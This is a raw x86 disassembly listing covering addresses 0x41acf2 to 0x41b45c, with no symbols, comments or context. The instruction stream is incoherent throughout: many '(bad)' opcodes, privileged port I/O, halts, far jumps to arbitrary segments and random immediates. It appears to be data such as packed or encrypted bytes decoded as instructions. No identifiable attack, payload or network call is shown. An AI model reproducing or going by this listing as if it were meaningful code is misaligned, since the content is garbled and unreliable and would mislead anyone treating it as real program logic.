  41acf2:	sbb    DWORD PTR [ebp+0x44d956ef],esp
  41acf8:	jp     0x41acdc
  41acfa:	mov    esp,0xf5023318
  41acff:	test   BYTE PTR [edi+0x7ad105e2],0x87
  41ad06:	cmp    BYTE PTR [eax],dh
  41ad08:	out    0xe8,al
  41ad0a:	mov    eax,ds:0x70ff2a63
  41ad0f:	aam    0xb2
  41ad11:	mov    ebp,0x280c45f2
  41ad16:	mov    edx,0x5d9f0aa
  41ad1b:	ss in  eax,dx
  41ad1d:	and    BYTE PTR [ecx+0x464abfef],dh
  41ad23:	pop    edi
  41ad24:	jmp    0x41ad43
  41ad26:	mov    ecx,0xce7532c4
  41ad2b:	dec    eax
  41ad2c:	or     eax,0x8b0cc80c
  41ad31:	cmp    ch,bh
  41ad33:	inc    eax
  41ad34:	mov    al,0x3
  41ad36:	and    eax,0xc325555
  41ad3b:	in     eax,dx
  41ad3c:	jecxz  0x41ad54
  41ad3e:	and    dl,ch
  41ad40:	test   eax,0x941b74f0
  41ad45:	cmp    ebp,ecx
  41ad47:	pushf  
  41ad48:	enter  0xc981,0xad
  41ad4c:	mov    DWORD PTR [eax],edi
  41ad4e:	push   esi
  41ad4f:	cmp    al,0x1f
  41ad51:	div    BYTE PTR [eax]
  41ad53:	inc    ebp
  41ad54:	add    dl,BYTE PTR [esi-0x6be852b7]
  41ad5a:	clc    
  41ad5b:	sub    ebp,DWORD PTR [ebp+0x72a81ec3]
  41ad61:	pop    ebp
  41ad62:	fstp   QWORD PTR [edi]
  41ad64:	in     al,dx
  41ad65:	bts    DWORD PTR ss:[esi],ebx
  41ad69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6a:	retf   0x32dd
  41ad6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad6e:	outs   dx,DWORD PTR ds:[esi]
  41ad6f:	push   esp
  41ad70:	hlt    
  41ad71:	iret   
  41ad72:	stos   BYTE PTR es:[edi],al
  41ad73:	in     al,dx
  41ad74:	sub    ecx,DWORD PTR [ebp+0x1]
  41ad77:	stos   BYTE PTR es:[edi],al
  41ad78:	cmp    DWORD PTR [ecx+0x18c9800b],ebx
  41ad7e:	in     eax,dx
  41ad7f:	lock lahf 
  41ad81:	add    eax,0x7f6dc99c
  41ad86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad87:	imul   ebp,DWORD PTR [esi],0xa859a0c9
  41ad8d:	popa   
  41ad8e:	inc    esp
  41ad8f:	cld    
  41ad90:	push   esp
  41ad91:	sbb    eax,0x1393737b
  41ad96:	dec    esp
  41ad97:	push   ss
  41ad98:	or     al,0xbd
  41ad9a:	push   cs
  41ad9b:	mov    al,0xc7
  41ad9d:	jae    0x41ad71
  41ad9f:	gs mov al,0x8
  41ada2:	into   
  41ada3:	sbb    eax,0x0
	...
  41adb0:	add    BYTE PTR [edi],al
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4-0x328d27ac],0x11
  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [ebx+0x55000003],ch
  41adca:	rcl    dl,0x23
  41adcd:	mov    ch,0x6
  41adcf:	mov    BYTE PTR [eax+edi*1],bl
  41add2:	mov    ebx,0xdcc90b76
  41add7:	scas   al,BYTE PTR es:[edi]
  41add8:	mov    ebx,0xf42cf7c
  41addd:	fidiv  WORD PTR [edi]
  41addf:	push   eax
  41ade0:	mov    ds:0x8ece8b60,al
  41ade5:	adc    esp,DWORD PTR [ebx+eiz*4+0x608a3dae]
  41adec:	test   DWORD PTR [edi+0x59516e93],eax
  41adf2:	xchg   ebp,eax
  41adf3:	loopne 0x41adf8
  41adf5:	cmc    
  41adf6:	les    ecx,FWORD PTR [edi-0x50]
  41adf9:	cs mov bl,0xc9
  41adfc:	mov    dh,0xcf
  41adfe:	lea    edx,[ebx+0x2d]
  41ae01:	adc    BYTE PTR [esi+edi*1+0x19],ch
  41ae05:	mov    ebp,0x256e41fb
  41ae0a:	xor    ecx,DWORD PTR [ecx-0x66]
  41ae0d:	rcr    dl,0x70
  41ae10:	aad    0xfb
  41ae12:	stos   DWORD PTR es:[edi],eax
  41ae13:	push   esp
  41ae14:	push   es
  41ae15:	aam    0x5d
  41ae17:	push   ss
  41ae18:	and    eax,0x839300b
  41ae1d:	and    cl,dh
  41ae1f:	add    eax,0xb8fbc44f
  41ae24:	int3   
  41ae25:	push   ebp
  41ae26:	stc    
  41ae27:	test   DWORD PTR [ecx+0x55076233],ebp
  41ae2d:	mov    ds:0x638eaa93,eax
  41ae32:	out    0xc2,al
  41ae34:	jge    0x41adb9
  41ae36:	push   0xecdf16dc
  41ae3b:	ss test ah,ah
  41ae3e:	pop    esi
  41ae3f:	lods   al,BYTE PTR ds:[esi]
  41ae40:	shl    DWORD PTR [ecx+ebx*8-0x7e],1
  41ae44:	inc    ebp
  41ae45:	ins    BYTE PTR es:[edi],dx
  41ae46:	(bad)  
  41ae47:	test   eax,0x3a51d9af
  41ae4c:	or     edi,DWORD PTR [edx-0x3a]
  41ae4f:	into   
  41ae50:	and    eax,0x8f740f70
  41ae55:	(bad)  
  41ae56:	push   ebx
  41ae57:	xchg   esp,eax
  41ae58:	fdiv   DWORD PTR [eax+0x218e3fb]
  41ae5e:	xchg   ecx,eax
  41ae5f:	inc    ecx
  41ae60:	push   edi
  41ae61:	clc    
  41ae62:	xlat   BYTE PTR ds:[ebx]
  41ae63:	in     al,0xaa
  41ae65:	pcmpgtb mm7,QWORD PTR [edi]
  41ae68:	ja     0x41adfc
  41ae6a:	push   es
  41ae6b:	mov    edi,0x10c617dd
  41ae70:	cmp    al,0x85
  41ae72:	leave  
  41ae73:	arpl   sp,si
  41ae75:	or     esp,DWORD PTR [ecx+0x5a61b4e]
  41ae7b:	iret   
  41ae7c:	jns    0x41ae16
  41ae7e:	xchg   ebp,eax
  41ae7f:	push   edx
  41ae80:	dec    ebx
  41ae81:	dec    eax
  41ae82:	clc    
  41ae83:	mov    al,ds:0xd58200a4
  41ae88:	xchg   ebx,eax
  41ae89:	sbb    dh,BYTE PTR [ebp-0x63]
  41ae8c:	add    esp,DWORD PTR [edx]
  41ae8e:	inc    esp
  41ae8f:	inc    ebp
  41ae90:	(bad)  
  41ae91:	jl     0x41af0a
  41ae93:	jb     0x41aefc
  41ae95:	mov    ds:0xbf0420d1,al
  41ae9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae9b:	inc    edx
  41ae9c:	out    dx,eax
  41ae9d:	scas   eax,DWORD PTR es:[edi]
  41ae9e:	xor    edx,DWORD PTR ds:0xc45cc31
  41aea4:	jl     0x41ae47
  41aea6:	cli    
  41aea7:	jmp    0x41ae48
  41aea9:	dec    ebx
  41aeaa:	mov    eax,ds:0x76a92b51
  41aeaf:	icebp  
  41aeb0:	loope  0x41ae9c
  41aeb2:	(bad)  
  41aeb3:	adc    DWORD PTR [eax+0x14],ebx
  41aeb6:	sub    BYTE PTR [esp+eax*2-0x13ccd9c3],0xa8
  41aebe:	mov    ds:0x80d1a2e8,eax
  41aec3:	(bad)  
  41aec4:	mov    ds:0xd424d88d,al
  41aec9:	test   DWORD PTR [edi+0x6b],0xb073a9bf
  41aed0:	xchg   ebx,eax
  41aed1:	adc    esi,DWORD PTR [esp+esi*4+0x6b]
  41aed5:	jl     0x41aece
  41aed7:	push   ebp
  41aed8:	xchg   BYTE PTR [edx-0x42a01c67],bl
  41aede:	and    ebp,DWORD PTR [eax+eiz*4-0xe]
  41aee2:	(bad)
  41aee7:	aaa    
  41aee8:	stc    
  41aee9:	add    DWORD PTR [ebx+0x73fb5098],esi
  41aeef:	fcmovu st,st(3)
  41aef1:	xor    al,0x9a
  41aef3:	ja     0x41af61
  41aef5:	lds    ecx,FWORD PTR [esi]
  41aef7:	jne    0x41aec7
  41aef9:	jecxz  0x41aec7
  41aefb:	xchg   bl,bl
  41aefd:	pusha  
  41aefe:	jge    0x41aec4
  41af00:	mov    bh,0x1b
  41af02:	lea    esi,[edi-0x2e]
  41af05:	mov    dl,0x44
  41af07:	mov    ds:0xd1a659ef,eax
  41af0c:	shl    DWORD PTR [eax+0x29cc8f8c],cl
  41af12:	mov    DWORD PTR ds:0xce1036a0,ecx
  41af18:	pop    ebx
  41af19:	dec    esp
  41af1a:	or     eax,0x49dd39b7
  41af1f:	push   ebx
  41af20:	scas   al,BYTE PTR es:[edi]
  41af21:	cs inc ebx
  41af23:	add    bl,BYTE PTR [edi+ebp*8+0xd7b3ec9]
  41af2a:	fiadd  WORD PTR [ebp+0xd19aca1]
  41af30:	sub    cl,BYTE PTR [ebx-0x1a]
  41af33:	fsub   DWORD PTR [edi-0xa]
  41af36:	imul   ebp,DWORD PTR [esi-0x229c82b1],0x28fc09b9
  41af40:	inc    ebx
  41af41:	push   0x178ad3d8
  41af46:	cwde   
  41af47:	ins    DWORD PTR es:[edi],dx
  41af48:	pop    eax
  41af49:	repnz shl BYTE PTR [ecx+0xa],0xaf
  41af4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af4f:	sbb    bl,BYTE PTR [edx+edx*4-0x5730970]
  41af56:	jb     0x41af7d
  41af58:	imul   esi,DWORD PTR [edi+0x53],0xffffff9b
  41af5c:	int3   
  41af5d:	pcmpgtw mm2,QWORD PTR [esi]
  41af60:	dec    ebp
  41af61:	jb     0x41af0b
  41af63:	and    esi,edx
  41af65:	or     DWORD PTR [ebp-0x74],ecx
  41af68:	test   BYTE PTR [ebp+0x4587efb4],ch
  41af6e:	pop    esp
  41af6f:	inc    ebp
  41af70:	mov    cs,WORD PTR [edx+0x11b66263]
  41af76:	xchg   edx,eax
  41af77:	and    eax,0xf4aa4aa7
  41af7c:	lods   al,BYTE PTR ds:[esi]
  41af7d:	sub    edi,ebx
  41af7f:	test   eax,0x62d9f6a6
  41af84:	push   edx
  41af85:	pop    ebp
  41af86:	cmp    al,0x32
  41af88:	push   ecx
  41af8a:	xchg   edx,eax
  41af8b:	mov    edi,0x64f4d2e5
  41af90:	or     al,0x3c
  41af92:	es ret 0x2bff
  41af96:	rcl    edx,cl
  41af98:	push   0x348d1b1f
  41af9d:	dec    edx
  41af9e:	inc    eax
  41af9f:	push   esp
  41afa0:	cmp    al,0xcd
  41afa2:	mov    ds:0xefc60f4f,eax
  41afa7:	sbb    bh,BYTE PTR [eax+0x5e]
  41afaa:	push   ecx
  41afab:	mov    esp,0x854c7d41
  41afb0:	leave  
  41afb1:	push   esp
  41afb2:	and    BYTE PTR [edi+0x21],bl
  41afb5:	pop    ebp
  41afb6:	adc    BYTE PTR [eax-0x73c49c5a],dl
  41afbc:	pop    ecx
  41afbd:	push   ebp
  41afbe:	adc    cl,BYTE PTR [edx+0x27f01819]
  41afc4:	sbb    ah,bh
  41afc6:	in     eax,0xb4
  41afc8:	int3   
  41afc9:	xchg   ebp,eax
  41afca:	add    ebp,0xb5ef1c2
  41afd0:	adc    BYTE PTR [ebx+0x4d97254],dl
  41afd6:	fnstenv [esi]
  41afd8:	pop    edx
  41afd9:	add    esp,edx
  41afdb:	(bad)
  41afde:	pop    esp
  41afdf:	arpl   WORD PTR [ebx],di
  41afe1:	add    al,BYTE PTR [ebx-0x4f7ea3a9]
  41afe7:	das    
  41afe8:	adc    BYTE PTR [eax],cl
  41afea:	js     0x41afa3
  41afec:	jnp    0x41afc8
  41afee:	iret   
  41afef:	sub    DWORD PTR [esi],edx
  41aff1:	jge    0x41b016
  41aff3:	test   al,bh
  41aff5:	adc    DWORD PTR [ebp-0x4d],esi
  41aff8:	fld    TBYTE PTR [edx-0x75f7bc0d]
  41affe:	push   cs
  41afff:	cld    
  41b000:	retf   
  41b001:	mov    ds:0x33aa1da0,eax
  41b006:	bound  esp,QWORD PTR [edx-0xc666fa9]
  41b00c:	lods   al,BYTE PTR ds:[esi]
  41b00d:	xchg   BYTE PTR [esi+0x3c],bl
  41b010:	scas   al,BYTE PTR es:[edi]
  41b011:	test   edi,ecx
  41b013:	int    0x87
  41b015:	xchg   esp,eax
  41b016:	mov    dl,BYTE PTR ds:0x9b3c76ac
  41b01c:	mov    al,ds:0xf943a32f
  41b021:	sti    
  41b022:	adc    al,0x2
  41b024:	xchg   ebx,esi
  41b026:	fcmovnb st,st(0)
  41b028:	repnz xor al,0x70
  41b02b:	das    
  41b02c:	fnsave [ebx]
  41b02e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b02f:	cmp    cl,BYTE PTR [ebx]
  41b031:	inc    esp
  41b032:	and    dh,BYTE PTR [edx]
  41b034:	jecxz  0x41b0a6
  41b036:	or     BYTE PTR [ecx+0x3ec05f99],al
  41b03c:	adc    al,0xb0
  41b03e:	dec    eax
  41b03f:	mov    edi,DWORD PTR [ecx+0x6442fbd1]
  41b045:	int    0x38
  41b047:	in     eax,dx
  41b048:	dec    edx
  41b049:	inc    esi
  41b04a:	adc    BYTE PTR [edi+0x32],al
  41b04d:	pop    edx
  41b04e:	or     BYTE PTR [edi+0x30],cl
  41b051:	cmp    eax,DWORD PTR [esp+edi*8-0x279c3c86]
  41b058:	xlat   BYTE PTR ds:[ebx]
  41b059:	add    eax,0xa39ba1f
  41b05e:	and    al,0x13
  41b060:	sti    
  41b061:	lds    edi,FWORD PTR [eax+0x646d7291]
  41b067:	(bad)  
  41b068:	or     DWORD PTR [eax],ebx
  41b06a:	mov    dl,0x4e
  41b06c:	gs jne 0x41b0c6
  41b06f:	pop    eax
  41b070:	mov    BYTE PTR [eax+0x45],ah
  41b073:	dec    edx
  41b074:	inc    esi
  41b075:	inc    eax
  41b076:	ins    DWORD PTR es:[edi],dx
  41b077:	dec    ebx
  41b078:	push   0xe9c2e160
  41b07d:	mov    dh,0xbb
  41b07f:	mov    cl,0xa
  41b081:	jmp    0x41b01a
  41b083:	pop    ecx
  41b084:	mov    ds:0xde7c7c65,al
  41b089:	mov    DWORD PTR [esi],edx
  41b08b:	jge    0x41b086
  41b08d:	pushf  
  41b08e:	pop    edx
  41b08f:	mov    bh,0xb
  41b091:	aad    0x39
  41b093:	inc    ebp
  41b094:	or     DWORD PTR [edi-0x7e988246],0x24
  41b09b:	mov    dl,0xf
  41b09d:	leave  
  41b09e:	mov    DWORD PTR [ebx-0x53a47339],edi
  41b0a4:	sub    al,0xcc
  41b0a6:	bound  eax,QWORD PTR [edx+esi*8+0x4fa0cf89]
  41b0ad:	jp     0x41b0da
  41b0af:	lds    edx,FWORD PTR [edx]
  41b0b1:	enter  0xb5c2,0xe7
  41b0b5:	les    ecx,FWORD PTR [edi+0x79006a29]
  41b0bb:	pop    ss
  41b0bc:	sbb    DWORD PTR gs:[edx],eax
  41b0bf:	xor    DWORD PTR [edi-0x64820ce1],edi
  41b0c5:	(bad)
  41b0c8:	test   DWORD PTR [esi+esi*8+0x7b],edi
  41b0cc:	pop    es
  41b0cd:	mov    bl,0x98
  41b0cf:	sub    BYTE PTR [eax+0x60],bh
  41b0d2:	scas   eax,DWORD PTR es:[edi]
  41b0d3:	push   ebx
  41b0d4:	ret    
  41b0d5:	dec    ecx
  41b0d6:	dec    esi
  41b0d7:	scas   al,BYTE PTR es:[edi]
  41b0d8:	fistp  QWORD PTR [edx]
  41b0da:	fs out dx,al
  41b0dc:	loop   0x41b0c9
  41b0de:	loopne 0x41b119
  41b0e0:	inc    edi
  41b0e1:	(bad)  
  41b0e2:	mov    dh,0xd3
  41b0e4:	jo     0x41b139
  41b0e6:	cdq    
  41b0e7:	or     al,0xe0
  41b0e9:	adc    bl,BYTE PTR [ecx+0x76e091aa]
  41b0ef:	pop    eax
  41b0f0:	push   ds
  41b0f1:	dec    eax
  41b0f2:	pop    eax
  41b0f3:	sbb    bl,BYTE PTR [eax-0x65f93cd5]
  41b0f9:	imul   ebx,DWORD PTR [eax+0x36],0x32
  41b0fd:	pop    ebx
  41b0fe:	and    BYTE PTR [eax-0x52680e34],ah
  41b104:	adc    esp,DWORD PTR [eax]
  41b106:	jbe    0x41b0d7
  41b108:	shl    DWORD PTR [edx-0x71],0x73
  41b10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b10d:	icebp  
  41b10e:	fwait
  41b10f:	mov    esi,0xbc0d9f4f
  41b114:	sahf   
  41b115:	and    al,0xff
  41b117:	sar    BYTE PTR [edx],cl
  41b119:	xor    eax,0x1fae8111
  41b11e:	jecxz  0x41b108
  41b120:	or     BYTE PTR [eax+0x1],ah
  41b123:	adc    ecx,DWORD PTR [eax]
  41b125:	cmp    ch,BYTE PTR [esi+0x19fd5c2a]
  41b12b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b12c:	jle    0x41b152
  41b12e:	xchg   edx,eax
  41b12f:	push   ecx
  41b130:	adc    bl,ch
  41b132:	xchg   esp,eax
  41b133:	jns    0x41b10b
  41b135:	pop    edi
  41b136:	jmp    0xa3ab:0x67aa4bdf
  41b13d:	pop    ss
  41b13e:	jb     0x41b121
  41b140:	pop    edx
  41b141:	sbb    eax,ecx
  41b143:	xchg   esp,eax
  41b144:	and    esi,DWORD PTR ds:0xad58053b
  41b14a:	add    al,0xd9
  41b14c:	mov    al,ds:0xa5aeaa64
  41b151:	adc    BYTE PTR [eax+0x3a],dl
  41b154:	test   DWORD PTR [ecx-0x110faff4],0x43551559
  41b15e:	(bad)  
  41b15f:	lods   al,BYTE PTR ds:[esi]
  41b160:	sub    DWORD PTR [edi+edi*1+0x5f],esp
  41b164:	stos   WORD PTR es:[edi],ax
  41b166:	push   es
  41b167:	add    esp,DWORD PTR [ebp+0x48]
  41b16a:	aam    0x5d
  41b16c:	test   edx,ebp
  41b16e:	dec    edi
  41b16f:	lahf   
  41b170:	sub    cl,BYTE PTR [edx]
  41b172:	not    BYTE PTR [ebp+0x0]
	...
  41b181:	jecxz  0x41b16b
  41b183:	nop
  41b184:	rcr    BYTE PTR [ebx+0x79fbe3f8],1
  41b18a:	dec    edx
  41b18b:	shr    ebp,0x49
  41b18e:	into   
  41b18f:	shr    bh,0xbc
  41b192:	add    DWORD PTR cs:[eax],eax
  41b195:	stos   DWORD PTR es:[edi],eax
  41b196:	add    eax,DWORD PTR [eax]
  41b198:	add    bl,ah
  41b19a:	xor    eax,0x47570be4
  41b19f:	dec    edx
  41b1a0:	lods   eax,DWORD PTR ds:[esi]
  41b1a1:	lods   al,BYTE PTR ds:[esi]
  41b1a2:	jne    0x41b152
  41b1a4:	add    DWORD PTR [edi+0x46],esp
  41b1a7:	les    ebx,FWORD PTR [esi]
  41b1a9:	dec    ebx
  41b1aa:	aad    0x1b
  41b1ac:	fild   QWORD PTR [ebp+0x42]
  41b1af:	jne    0x41b193
  41b1b1:	sbb    edi,DWORD PTR [eax]
  41b1b3:	jbe    0x41b168
  41b1b5:	sub    BYTE PTR [ecx],bl
  41b1b7:	push   ebp
  41b1b8:	ror    BYTE PTR [edi+0x43],cl
  41b1bb:	js     0x41b1fa
  41b1bd:	not    esp
  41b1bf:	shl    BYTE PTR [edx],1
  41b1c1:	xchg   ebp,eax
  41b1c2:	es fcmovne st,st(0)
  41b1c5:	fs dec esp
  41b1c7:	sbb    ah,BYTE PTR [edi]
  41b1c9:	aaa    
  41b1ca:	(bad)  
  41b1cb:	and    al,0x5
  41b1cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1ce:	mov    eax,ds:0x225140c5
  41b1d3:	aaa    
  41b1d4:	lods   al,BYTE PTR ds:[esi]
  41b1d5:	out    0x9,eax
  41b1d7:	mov    esi,0x2b5d4fcc
  41b1dc:	inc    eax
  41b1dd:	call   DWORD PTR [ebp+0x1388f01d]
  41b1e3:	mov    cl,0xbf
  41b1e5:	or     DWORD PTR [esi],edx
  41b1e7:	pop    ebp
  41b1e8:	cli    
  41b1e9:	mov    ebx,0x1ff76619
  41b1ee:	xchg   BYTE PTR [eax],bh
  41b1f0:	cmp    DWORD PTR ds:0x7c86042d,edx
  41b1f6:	ffree  st(0)
  41b1f8:	mov    es,WORD PTR [edx]
  41b1fa:	pop    esp
  41b1fb:	cld    
  41b1fc:	inc    edx
  41b1fd:	shr    esp,1
  41b1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b200:	das    
  41b201:	out    dx,eax
  41b202:	and    eax,0x8b94c6a8
  41b207:	pop    ebx
  41b208:	icebp  
  41b209:	xchg   esp,eax
  41b20a:	sti    
  41b20b:	ins    DWORD PTR es:[edi],dx
  41b20c:	sub    eax,0x81ccf20c
  41b211:	ins    DWORD PTR es:[edi],dx
  41b212:	jl     0x41b25b
  41b214:	ret    
  41b215:	xor    DWORD PTR [edx+0x37719195],0x55866173
  41b21f:	add    ah,dh
  41b221:	mov    edi,0x9db85fc8
  41b226:	fsub   DWORD PTR [eax]
  41b228:	add    BYTE PTR [edi+0x7e],ah
  41b22b:	mov    bh,0x34
  41b22d:	jnp    0x41b23f
  41b22f:	enter  0x4cd2,0x85
  41b233:	cmc    
  41b234:	adc    ebp,edx
  41b236:	sub    eax,esi
  41b238:	ins    DWORD PTR es:[edi],dx
  41b239:	dec    ecx
  41b23a:	inc    ebx
  41b23b:	pop    edi
  41b23c:	call   0x7930:0x29bd6f7b
  41b243:	mov    cl,0xf7
  41b245:	mov    WORD PTR [ecx],fs
  41b247:	cli    
  41b248:	jnp    0x41b256
  41b24a:	mov    DWORD PTR [edx+edx*2-0x7c],esi
  41b24e:	xchg   DWORD PTR [edx-0x764dfb2],ecx
  41b254:	mov    esp,0x5629e3ed
  41b259:	or     DWORD PTR [edi+0x21cf1510],ebx
  41b25f:	fiadd  DWORD PTR [edx]
  41b261:	jo     0x41b254
  41b263:	pusha  
  41b264:	popa   
  41b265:	imul   ecx,DWORD PTR [edi],0x7b7a0096
  41b26b:	popf   
  41b26c:	adc    BYTE PTR [edi],bl
  41b26e:	cmp    edx,ebx
  41b270:	sbb    dl,BYTE PTR [eax-0x7b43f350]
  41b276:	scas   eax,DWORD PTR es:[edi]
  41b277:	inc    eax
  41b278:	call   0x9278:0x5ccb2dfd
  41b27f:	push   edx
  41b280:	fistp  DWORD PTR [edx+edi*4-0x1f9d8f80]
  41b287:	xor    dh,0xa2
  41b28a:	jg     0x41b232
  41b28c:	xchg   edi,eax
  41b28d:	inc    edx
  41b28e:	push   0x643ba37b
  41b293:	cld    
  41b294:	cld    
  41b295:	pop    eax
  41b296:	jae    0x41b301
  41b298:	sbb    DWORD PTR [ecx+ecx*1+0x9],esi
  41b29c:	inc    eax
  41b29d:	hlt    
  41b29e:	test   BYTE PTR [eax+0xf],0x4f
  41b2a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2a3:	sub    dl,BYTE PTR [eax-0x43]
  41b2a6:	add    al,0x30
  41b2a9:	cdq    
  41b2aa:	push   ebp
  41b2ab:	sub    DWORD PTR [esp+eax*4-0x3f6bcbf],esp
  41b2b2:	sub    esp,0xf76d82e6
  41b2b8:	pop    ecx
  41b2b9:	test   BYTE PTR [ecx+0x11],0xd0
  41b2bd:	inc    ebp
  41b2be:	cmp    BYTE PTR [edx+0x4869959],cl
  41b2c4:	jp     0x41b269
  41b2c6:	ficom  DWORD PTR [ebx+0x5e7c58ea]
  41b2cc:	sar    BYTE PTR [esi+0x10e5ea70],0xdb
  41b2d3:	dec    ebp
  41b2d4:	jo     0x41b280
  41b2d6:	push   cs
  41b2d7:	gs int3 
  41b2d9:	xchg   edi,eax
  41b2da:	mul    BYTE PTR [ebx+eiz*2]
  41b2dd:	dec    esi
  41b2de:	sar    DWORD PTR [ebx+ebx*4+0x22fb3d80],1
  41b2e5:	dec    esp
  41b2e6:	adc    al,0xa8
  41b2e8:	xchg   BYTE PTR [ecx-0x12951d86],cl
  41b2ee:	add    dl,al
  41b2f0:	fwait
  41b2f1:	test   eax,eax
  41b2f3:	mov    esp,0xe69b989e
  41b2f8:	mov    bh,BYTE PTR [eax+edx*4-0x2bde536c]
  41b2ff:	bound  esi,QWORD PTR [esi+ebp*8-0x628de651]
  41b306:	mov    eax,0x8ab051a0
  41b30b:	fs mov cl,0x8d
  41b30e:	sub    al,0x59
  41b310:	je     0x41b37f
  41b312:	fmul   QWORD PTR [esp+ecx*8+0x40604d04]
  41b319:	xor    ch,dh
  41b31b:	mov    edx,0xddc3bb7e
  41b320:	in     eax,dx
  41b321:	or     al,0x2d
  41b323:	and    ch,bh
  41b325:	cmp    al,dh
  41b327:	pop    es
  41b328:	mov    esi,ebx
  41b32a:	add    eax,0x24bdc12
  41b32f:	push   edx
  41b330:	pop    edi
  41b331:	dec    DWORD PTR [edi+0x6e363165]
  41b337:	(bad)  
  41b338:	push   edx
  41b339:	mov    bl,0x45
  41b33b:	pop    ebp
  41b33c:	daa    
  41b33d:	lea    esp,[edi]
  41b33f:	ins    BYTE PTR es:[edi],dx
  41b340:	xor    eax,0xc554473f
  41b345:	arpl   WORD PTR [esi+esi*1-0x7698c3bf],bx
  41b34c:	mov    eax,0x57e0a5d5
  41b351:	mov    al,0xc3
  41b353:	mov    ah,0x2f
  41b355:	mov    ds:0x23a02f34,al
  41b35a:	test   esi,esp
  41b35c:	adc    ebp,edi
  41b35e:	nop
  41b35f:	add    DWORD PTR [ebp+0x476e53dd],eax
  41b365:	lods   eax,DWORD PTR ds:[esi]
  41b366:	int    0xbe
  41b368:	sbb    esp,DWORD PTR [esi]
  41b36a:	fiadd  DWORD PTR [ebx]
  41b36c:	clc    
  41b36d:	push   edi
  41b36e:	ins    DWORD PTR es:[edi],dx
  41b36f:	sub    BYTE PTR [ebx-0x33],ah
  41b372:	mov    DWORD PTR [edx-0x2c39af12],edi
  41b378:	inc    ebx
  41b379:	std    
  41b37a:	(bad)  
  41b37b:	pop    ds
  41b37c:	xor    al,0x72
  41b37e:	inc    edi
  41b37f:	mov    bl,0x5f
  41b381:	int    0x42
  41b383:	dec    eax
  41b384:	gs push ds
  41b386:	mov    al,ds:0x9cc35c3f
  41b38c:	retf   0xa643
  41b38f:	push   ds
  41b390:	jo     0x41b36c
  41b392:	xor    ebx,eax
  41b394:	shr    ecx,cl
  41b396:	sbb    ebx,DWORD PTR es:[ebx-0x524756ee]
  41b39d:	sahf   
  41b39e:	(bad)  
  41b39f:	xor    DWORD PTR [eax-0x57],ecx
  41b3a2:	jns    0x41b419
  41b3a4:	pop    esp
  41b3a5:	pop    es
  41b3a6:	mov    ah,BYTE PTR [ebx]
  41b3a8:	shl    DWORD PTR [ecx+0xf],0x9
  41b3ac:	cmp    BYTE PTR [edx+0x7f80f87f],0x76
  41b3b3:	ins    BYTE PTR es:[edi],dx
  41b3b4:	cld    
  41b3b5:	out    dx,eax
  41b3b6:	fst    DWORD PTR [eax+0x188616e]
  41b3bc:	adc    esp,DWORD PTR [edx+0x26]
  41b3bf:	pop    ss
  41b3c0:	cmc    
  41b3c1:	xchg   BYTE PTR [esi+0x59e09fe4],cl
  41b3c7:	in     eax,dx
  41b3c8:	loope  0x41b39a
  41b3ca:	sbb    dl,al
  41b3cc:	mov    ch,0xc
  41b3ce:	scas   al,BYTE PTR es:[edi]
  41b3cf:	add    eax,0xa8a0dd16
  41b3d4:	sub    esp,DWORD PTR [edx+0x46]
  41b3d7:	shr    dh,cl
  41b3d9:	xlat   BYTE PTR ds:[ebx]
  41b3da:	adc    al,0x26
  41b3dc:	mov    al,ds:0xc8fd86e0
  41b3e1:	mov    ah,0xda
  41b3e3:	lahf   
  41b3e4:	pop    ecx
  41b3e5:	mov    edi,0x2483aee9
  41b3ea:	push   ebp
  41b3eb:	adc    ebp,eax
  41b3ed:	inc    eax
  41b3ee:	cwde   
  41b3ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3f0:	push   esp
  41b3f1:	loop   0x41b39c
  41b3f3:	mov    ah,0x1b
  41b3f5:	mov    BYTE PTR [edx-0x309cb627],ah
  41b3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3fc:	lock sub DWORD PTR [esi+0x267c0e33],ebp
  41b403:	add    al,0xe7
  41b405:	mov    al,ds:0x474c24cd
  41b40a:	or     BYTE PTR [eax],bh
  41b40c:	stos   DWORD PTR es:[edi],eax
  41b40d:	add    edx,ebp
  41b40f:	push   eax
  41b410:	push   cs
  41b411:	ins    BYTE PTR es:[edi],dx
  41b412:	jg     0x41b446
  41b414:	mov    bh,BYTE PTR [edx]
  41b416:	and    DWORD PTR [ebx-0x63],esi
  41b419:	mov    ds:0x3c25e0ee,eax
  41b41e:	inc    esi
  41b41f:	mov    BYTE PTR [edi-0x71ea0ba6],bl
  41b425:	pop    esp
  41b426:	lods   al,BYTE PTR ds:[esi]
  41b427:	in     al,dx
  41b428:	adc    al,0xc
  41b42a:	pop    ds
  41b42b:	in     eax,dx
  41b42c:	sbb    al,0x5d
  41b42e:	push   ecx
  41b42f:	jns    0x41b3bb
  41b431:	xchg   ebp,eax
  41b432:	lods   eax,DWORD PTR ds:[esi]
  41b433:	mov    bh,0xf4
  41b435:	mov    ebp,0xc7e67bd9
  41b43a:	lods   al,BYTE PTR ds:[esi]
  41b43b:	xchg   DWORD PTR ds:0xe435eaf8,eax
  41b441:	xlat   BYTE PTR ds:[ebx]
  41b442:	sbb    DWORD PTR [edx-0x55],edi
  41b445:	nop
  41b446:	ds pop esi
  41b448:	dec    esi
  41b449:	mov    dl,BYTE PTR [edx-0x686d891b]
  41b44f:	aaa    
  41b450:	xlat   BYTE PTR ds:[ebx]
  41b451:	xor    al,0xee
  41b453:	mov    al,ds:0x3fdc0946
  41b458:	pop    edx
  41b459:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b45a:	nop
  41b45b:	std    
  41b45c:	dec    edx
